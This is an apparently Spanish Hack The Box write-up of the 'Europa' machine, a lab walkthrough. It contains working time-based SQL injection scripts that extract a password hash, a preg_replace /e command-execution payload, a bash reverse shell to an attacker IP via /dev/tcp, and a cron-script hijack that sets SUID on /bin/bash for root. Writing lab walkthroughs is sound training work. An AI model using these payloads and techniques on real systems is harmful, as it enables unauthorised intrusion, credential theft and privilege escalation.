---
layout: post
title: Europa
date: 2023-06-06
description:
img:
fig-caption:
tags: [OSCP, eWPT, eWPTXv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Europa-htb/Europa.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inyección SQL - Time Based

* Abuso de Regex - RCE

* Abuso de tarea CRON (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.22 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 12:24 GMT
Nmap scan report for 10.10.10.22
Host is up (0.23s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 27.76 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,443 10.10.10.22 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 12:24 GMT
Nmap scan report for 10.10.10.22
Host is up (0.055s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b55420af7068c67c0e25c05db09fb78 (RSA)
|   256 b1ea5ec41c0a969e93db1dad22507475 (ECDSA)
|_  256 331f168dc024785f5bf56d7ff7b4f2e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.93 seconds
```

Añado el dominio ```europacorp.htb``` y los subdominios ```admin-portal.europacorp.htb``` y ```www.europacorp.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.10.22
http://10.10.10.22 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
```

Corresponde a la página por defecto de Apache

<img src="/writeups/assets/img/Europa-htb/1.png" alt="">

## Puerto 443 (HTTPS)

En base a los Common Names, puedo obtener subdominios

```null
openssl s_client -connect 10.10.10.22:443 | grep CN
Can't use SSL_get_servername
depth=0 C = GR, ST = Attica, L = Athens, O = EuropaCorp Ltd., OU = IT, CN = europacorp.htb, emailAddress = admin@europacorp.htb
verify error:num=18:self-signed certificate
verify return:1
depth=0 C = GR, ST = Attica, L = Athens, O = EuropaCorp Ltd., OU = IT, CN = europacorp.htb, emailAddress = admin@europacorp.htb
verify return:1
 0 s:C = GR, ST = Attica, L = Athens, O = EuropaCorp Ltd., OU = IT, CN = europacorp.htb, emailAddress = admin@europacorp.htb
   i:C = GR, ST = Attica, L = Athens, O = EuropaCorp Ltd., OU = IT, CN = europacorp.htb, emailAddress = admin@europacorp.htb
subject=C = GR, ST = Attica, L = Athens, O = EuropaCorp Ltd., OU = IT, CN = europacorp.htb, emailAddress = admin@europacorp.htb
issuer=C = GR, ST = Attica, L = Athens, O = EuropaCorp Ltd., OU = IT, CN = europacorp.htb, emailAddress = admin@europacorp.htb
```

En ```admin-portal.europacorp.htb``` puedo ver un panel de inicio de sesión

<img src="/writeups/assets/img/Europa-htb/2.png" alt="">

Es vulnerable a una inyección SQL basada en tiempo. Para validarlo, intercepté la petición con ```BurpSuite``` e introduje el siguiente payload

```null
test%40test.com' or sleep(5)-- -
```

Creo un script en python para dumpear datos. Primero obtengo el nombre de la base de datos actualmente en uso

```null
from pwn import *
import requests, pdb, signal, sys, time, string, urllib3

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales

main_url = "https://admin-portal.europacorp.htb/login.php"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

sqtime = 3

# HTTPs Insecure OFF
urllib3.disable_warnings()


def MakeRequest():

    p1 = log.progress("SQLi")
    p2 = log.progress("Database")

    s = requests.session()
    s.verify = False

    database = ""

    for dbs in range(1, 10):

        for position in range(1, 20):

            for character in characters:

                post_data = {
                    'email': "admin@europacorp.htb' and if(substr(database(),%d,1)='%s',sleep(%d),1)-- -" % (position, character, sqtime),
                    'password': 'test'

                }

                p1.status(post_data['email'])

                first_time = time.time()
                r = s.post(main_url, data=post_data)
                second_time = time.time()

                if second_time - first_time > sqtime:
                    database += character
                    p2.status(database)
                    break

    end_time = time.time()

if __name__ == '__main__':
    MakeRequest()
```

Después lo modifico para listar las tablas

```null
from pwn import *
import requests, pdb, signal, sys, time, string, urllib3

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales

main_url = "https://admin-portal.europacorp.htb/login.php"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "-_"

sqtime = 5

# HTTPs Insecure OFF
urllib3.disable_warnings()


def MakeRequest():

    p1 = log.progress("SQLi")
    p2 = log.progress("Tables")

    s = requests.session()
    s.verify = False

    table = ""

    for tbls in range(1, 10):

        for position in range(1, 20):

            for character in characters:

                post_data = {
                    'email': "admin@europacorp.htb' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=\"admin\"),%d,%d)='%s',sleep(%d),1)-- -" % (position, tbls, character, sqtime),
                    'password': 'test'

                }

                p1.status(post_data['email'])

                first_time = time.time()
                r = s.post(main_url, data=post_data)
                second_time = time.time()

                if second_time - first_time > sqtime:
                    table += character
                    p2.status(table)
                    break

        database += ", "

    end_time = time.time()

if __name__ == '__main__':
    MakeRequest()
```

```null
python3 sqli.py
[◣] SQLi: admin@europacorp.htb' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema="admin"),8,1)='5',sleep(5),1)-- -
[d] Tables: users
```

Para la tabla ```users``` enumero las columnas

```null
from pwn import *
import requests, pdb, signal, sys, time, string, urllib3

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales

main_url = "https://admin-portal.europacorp.htb/login.php"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "-_"

sqtime = 5

# HTTPs Insecure OFF
urllib3.disable_warnings()


def MakeRequest():

    p1 = log.progress("SQLi")
    p2 = log.progress("columns")

    s = requests.session()
    s.verify = False

    column = ""

    for clms in range(1, 10):

        for position in range(1, 10):

            for character in characters:

                post_data = {
                    'email': "admin@europacorp.htb' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=\"admin\" and table_name=\"users\"),%d,%d)='%s',sleep(%d),1)-- -" % (position, clms, character, sqtime),
                    'password': 'test'

                }

                p1.status(post_data['email'])

                first_time = time.time()
                r = s.post(main_url, data=post_data)
                second_time = time.time()

                if second_time - first_time > sqtime:
                    column += character
                    p2.status(column)
                    break

        column += ", "

    end_time = time.time()

if __name__ == '__main__':
    MakeRequest()
```

```null
python3 sqli.py
[▖] SQLi: admin@europacorp.htb' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema="admin" and table_name="users"),8,2)='x',sleep(5),1)-- -
[q] columns: id, username, email, password, active
```

Obtengo un hash en MD5

```null
python3 sqli.py
[......\.] SQLi: admin@europacorp.htb' and if(substr((select group_concat(username,0x3a,password) from users),49,1)='g',sleep(5),1)-- -
[↗] Data: administrator2b6d315337f18617ba18922c0b9597ff
```

Mediante ```Rainbow Tables``` extraigo la contraseña

<img src="/writeups/assets/img/Europa-htb/3.png" alt="">

Gano acceso al CMS

<img src="/writeups/assets/img/Europa-htb/4.png" alt="">

Puedo generar archivos de configuración

<img src="/writeups/assets/img/Europa-htb/5.png" alt="">

Intercepto la petición de generación con ```BurpSuite```

```null
POST /tools.php HTTP/1.1
Host: admin-portal.europacorp.htb
Cookie: PHPSESSID=lf6fo762ga7pof9760ic2te5c1
Content-Length: 1678
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://admin-portal.europacorp.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://admin-portal.europacorp.htb/tools.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

pattern=%2Fip_address%2F&ipaddress=&text=%22openvpn%22%3A+%7B%0D%0A++++++++%22vtun0%22%3A+%7B%0D%0A++++++++++++++++%22local-address%22%3A+%7B%0D%0A++++++++++++++++++++++++%2210.10.10.1%22%3A+%22%27%27%22%0D%0A++++++++++++++++%7D%2C%0D%0A++++++++++++++++%22local-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22mode%22%3A+%22site-to-site%22%2C%0D%0A++++++++++++++++%22openvpn-option%22%3A+%5B%0D%0A++++++++++++++++++++++++%22--comp-lzo%22%2C%0D%0A++++++++++++++++++++++++%22--float%22%2C%0D%0A++++++++++++++++++++++++%22--ping+10%22%2C%0D%0A++++++++++++++++++++++++%22--ping-restart+20%22%2C%0D%0A++++++++++++++++++++++++%22--ping-timer-rem%22%2C%0D%0A++++++++++++++++++++++++%22--persist-tun%22%2C%0D%0A++++++++++++++++++++++++%22--persist-key%22%2C%0D%0A++++++++++++++++++++++++%22--user+nobody%22%2C%0D%0A++++++++++++++++++++++++%22--group+nogroup%22%0D%0A++++++++++++++++%5D%2C%0D%0A++++++++++++++++%22remote-address%22%3A+%22ip_address%22%2C%0D%0A++++++++++++++++%22remote-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22shared-secret-key-file%22%3A+%22%2Fconfig%2Fauth%2Fsecret%22%0D%0A++++++++%7D%2C%0D%0A++++++++%22protocols%22%3A+%7B%0D%0A++++++++++++++++%22static%22%3A+%7B%0D%0A++++++++++++++++++++++++%22interface-route%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++%22ip_address%2F24%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++%22next-hop-interface%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++++++++++%22vtun0%22%3A+%22%27%27%22%0D%0A++++++++++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++%7D%0D%0A++++++++++++++++%7D%0D%0A++++++++%7D%0D%0A%7D%0D%0A++++++++++++++++++++++++++++++++
```

Puedo editar el patrón, que posteriormente se ve reflejado en el output. En este [artículo](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace) explcian como es posible remplazar archivos abusando de una función

```null
pattern=/test/e&ipaddress=system("whoami")&text="test"
```

Se ejecuta el comando exitosamente

<img src="/writeups/assets/img/Europa-htb/6.png" alt="">

Me envío una reverse shell. Para ello creo un ```index.html``` que comparto con un servicio HTTP con ```python``` con lo siguiente

```null
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1'
```

Gano acceso en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.22] 38088
bash: cannot set terminal process group (1421): Inappropriate ioctl for device
bash: no job control in this shell
www-data@europa:/var/www/admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@europa:/var/www/admin$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@europa:/var/www/admin$ export TERM=xterm
www-data@europa:/var/www/admin$ export SHELL=bash
www-data@europa:/var/www/admin$ stty rows 55 columns 209
```

Puedo ver la primera flag

```null
www-data@europa:/home/john$ cat user.txt 
61024e3c55626abb06c0256057d554e2
```

# Escalada

Existe una tarea CRON que ejecuta el usuario ```root``` cada minuto

```null
www-data@europa:/$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *	root	/var/www/cronjobs/clearlogs
```

Consiste en un script en PHP

```null
www-data@europa:/$ cat /var/www/cronjobs/clearlogs
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```

Ejecuta un script en bash que no existe en una ruta en la cual tengo capacidad de escritura

```null
www-data@europa:/$ ls -l /var/www/cmd/logcleared.sh
ls: cannot access '/var/www/cmd/logcleared.sh': No such file or directory
```

Creo yo un script que le asigne SUID a la ```bash``` y le doy permisos de ejecución

```null
www-data@europa:/$ cat /var/www/cmd/logcleared.sh
#!/bin/bash
chmod u+s /bin/bash
```

```null
www-data@europa:/$ chmod +x /var/www/cmd/logcleared.sh
```

Me convierto en ```root``` y puedo ver la segunda flag

```null
www-data@europa:/$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```

```null
www-data@europa:/$ bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt
b6344f3e49260984ee35a83aadc3f4a9
```